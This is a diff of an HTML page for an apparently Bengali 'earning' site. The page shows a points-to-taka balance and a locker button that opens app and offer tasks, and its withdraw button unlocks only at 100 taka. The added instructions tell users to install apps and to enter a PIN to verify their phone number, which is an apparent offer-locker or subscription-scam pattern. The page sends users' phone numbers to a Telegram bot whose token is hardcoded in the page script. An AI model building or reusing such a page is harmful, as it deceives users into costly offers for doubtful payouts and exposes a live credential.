@@ -8,18 +8,21 @@
     
     <style>
         body { font-family: 'Arial', sans-serif; background-color: #f0f2f5; text-align: center; margin: 0; padding: 0; color: #333; }
-        .header { background: linear-gradient(45deg, #ff9800, #ff5722); color: white; padding: 25px; font-size: 26px; font-weight: bold; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .balance-card { background: white; margin: 20px auto; padding: 25px; border-radius: 20px; width: 85%; box-shadow: 0 5px 15px rgba(0,0,0,0.08); border: 1px solid #eee; }
-        .points { font-size: 36px; color: #ff9800; font-weight: bold; margin: 5px 0; }
+        .header { background: linear-gradient(45deg, #ff9800, #ff5722); color: white; padding: 25px; font-size: 26px; font-weight: bold; }
+        .balance-card { background: white; margin: 20px auto; padding: 25px; border-radius: 20px; width: 85%; box-shadow: 0 5px 15px rgba(0,0,0,0.08); }
+        .points { font-size: 36px; color: #ff9800; font-weight: bold; }
         .taka { font-size: 22px; color: #2e7d32; font-weight: bold; margin-bottom: 10px; }
         .rate-info { font-size: 13px; color: #666; background: #fff3e0; display: inline-block; padding: 5px 15px; border-radius: 50px; margin-bottom: 15px; }
         
-        .btn-main { display: block; width: 80%; margin: 15px auto; padding: 18px; border-radius: 15px; font-size: 18px; font-weight: bold; text-decoration: none; border: none; transition: 0.3s; cursor: pointer; }
+        /* কাজ করার নিয়ম বক্স */
+        .guide-box { background: #e3f2fd; margin: 20px auto; padding: 15px; border-radius: 15px; width: 85%; text-align: left; border-left: 5px solid #2196f3; }
+        .guide-box h3 { margin-top: 0; color: #0d47a1; font-size: 18px; }
+        .guide-box ul { padding-left: 20px; font-size: 14px; line-height: 1.6; }
+
+        .btn-main { display: block; width: 80%; margin: 15px auto; padding: 18px; border-radius: 15px; font-size: 18px; font-weight: bold; border: none; transition: 0.3s; cursor: pointer; }
         .btn-work { background-color: #2196F3; color: white; box-shadow: 0 4px 12px rgba(33, 150, 243, 0.3); }
         .btn-withdraw { background-color: #bdbdbd; color: white; cursor: not-allowed; }
         .btn-active { background-color: #4caf50; cursor: pointer; box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3); }
-        
-        .footer { margin-top: 30px; font-size: 12px; color: #888; padding-bottom: 20px; }
     </style>
 </head>
 <body>
@@ -36,19 +39,24 @@
 
     <button onclick="call_locker();" class="btn-main btn-work">🚀 আনলিমিটেড কাজ করুন</button>
 
-    <button id="withdrawBtn" class="btn-main btn-withdraw" onclick="sendPaymentRequest()" disabled>💰 পেমেন্ট নিন (বিকাশ/নগদ)</button>
-
-    <div class="footer">
-        কাজ শেষ করার ২০-৩০ মিনিটের মধ্যে পয়েন্ট যোগ হবে।<br>
-        ভিপিএন ব্যবহার করলে পেমেন্ট পাবেন না।
+    <div class="guide-box">
+        <h3>📖 কাজ করার সঠিক নিয়ম:</h3>
+        <ul>
+            <li>উপরের নীল বাটনে ক্লিক করলে আপনার সামনে অনেকগুলো কাজ (Apps/Offers) আসবে।</li>
+            <li>যে কোনো একটি কাজ পছন্দ করে তার ওপর ক্লিক করুন।</li>
+            <li>যদি অ্যাপ ডাউনলোড করতে বলে, তবে অ্যাপটি নামিয়ে ৩০ সেকেন্ড ব্যবহার করুন।</li>
+            <li>যদি নম্বর ভেরিফাই করতে বলে, তবে সঠিক নম্বর দিয়ে পিন সাবমিট করুন।</li>
+            <li>একটি কাজ সফলভাবে শেষ করলে অটোমেটিক পয়েন্ট যোগ হবে।</li>
+        </ul>
     </div>
 
+    <button id="withdrawBtn" class="btn-main btn-withdraw" onclick="sendPaymentRequest()" disabled>💰 পেমেন্ট নিন (বিকাশ/নগদ)</button>
+
     <script>
-        // আপনার দেওয়া সঠিক তথ্যগুলো এখানে সেট করা হয়েছে
-        let userPoints = 0.00; // শুরুতে পয়েন্ট ০
-        const rate = 0.4; // ১০০ পয়েন্ট = ৪০ টাকা (১ পয়েন্ট = ০.৪ টাকা)
-        const botToken = "7763993767:AAF8_u_Hq43Yc67sHk7H4mk3EkFIF8NFLFw"; // আপনার টোকেন
-        const chatId = "8074594735"; // আপনার সঠিক চ্যাট আইডি (স্ক্রিনশট থেকে প্রাপ্ত)
+        let userPoints = 0.00; 
+        const rate = 0.4; 
+        const botToken = "7763993767:AAF8_u_Hq43Yc67sHk7H4mk3EkFIF8NFLFw"; 
+        const chatId = "8074594735"; 
 
         function updateUI() {
             let totalTaka = userPoints * rate;
@@ -56,13 +64,9 @@
             document.getElementById('userTaka').innerText = "৳ " + totalTaka.toFixed(2) + " Taka";
 
             let btn = document.getElementById('withdrawBtn');
-            // ১০০ টাকা বা তার বেশি হলে বাটন সক্রিয় হবে
             if (totalTaka >= 100) {
                 btn.classList.add('btn-active');
                 btn.disabled = false;
-            } else {
-                btn.classList.remove('btn-active');
-                btn.disabled = true;
             }
         }
 
@@ -71,16 +75,11 @@
             let number = prompt("আপনার নম্বরটি দিন:");
             
             if (method && number) {
-                const message = `🔔 নতুন পেমেন্ট রিকোয়েস্ট!\n🥭 অ্যাপ: মিষ্টি আম আর্নিং\n💰 টাকা: ৳${(userPoints * rate).toFixed(2)}\n📱 মাধ্যম: ${method}\n🔢 নম্বর: ${number}`;
-
+                const message = `🔔 পেমেন্ট রিকোয়েস্ট!\n💰 টাকা: ৳${(userPoints * rate).toFixed(2)}\n📱 মাধ্যম: ${method}\n🔢 নম্বর: ${number}`;
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
                 fetch(url).then(res => {
-                    if(res.ok) {
-                        alert("আপনার পেমেন্ট রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে!");
-                    } else {
-                        alert("কিছু একটা সমস্যা হয়েছে। আবার চেষ্টা করুন।");
-                    }
+                    if(res.ok) alert("সফলভাবে রিকোয়েস্ট পাঠানো হয়েছে!");
                 });
             }
         }
@@ -89,4 +88,5 @@
     </script>
 
 </body>
-</html>
+    </html>
+    
